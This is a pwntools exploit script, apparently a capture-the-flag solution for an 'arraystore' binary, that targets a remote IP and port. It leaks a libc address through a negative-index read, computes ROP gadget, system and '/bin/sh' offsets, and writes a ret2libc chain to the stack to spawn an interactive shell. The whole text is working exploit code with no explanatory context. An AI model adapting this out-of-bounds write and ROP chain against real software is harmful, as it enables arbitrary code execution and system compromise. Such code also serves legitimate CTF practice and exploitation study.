#!/usr/bin/python3
from pwn import *
p = process(b"./arraystore_patched")
gdb.attach(p,'''c''')
context.arch = 'amd64'
p = remote('34.124.157.94', 10546)

def read_f(idx):
    p.sendlineafter(b":", b"R")
    p.sendlineafter(b":", b"-" + str(idx).encode())

def write_am(idx, data):
    p.sendlineafter(b"Read/Write?:", b"W")
    p.sendlineafter(b"Index:", b"-" + str(idx).encode())
    p.sendlineafter(b":", str(data))

def write_duong(idx, data):
    p.sendlineafter(b"Read/Write?:", b"W")
    p.sendlineafter(b"Index:", str(idx))
    p.sendlineafter(b":", str(data))

read_f(0x7fffffffffffffff-120)
p.recvuntil(b"Value:")
libc_base = int(p.recvline(),10) - 2509552 + 2338144
print("[+]Libc_base:    ", hex(libc_base))

ret = 0x0000000000029cd6 + libc_base
rdi = 0x000000000002a3e5 + libc_base
system = 0x0000000000050d60 + libc_base
binsh = 0x1d8698 + libc_base

print("[+]Libc_ret:    ", hex(ret))
print("[+]Libc_rdi:    ", hex(rdi))
print("[+]Libc_sys:    ", hex(system))
print("[+]Libc_binsh:    ", hex(binsh))

write_am(0x7fffffffffffffff-120, ret)
write_am(0x7fffffffffffffff-121, rdi)
write_am(0x7fffffffffffffff-122, binsh)
write_am(0x7fffffffffffffff-123, system)

p.sendline(b"a")
p.interactive()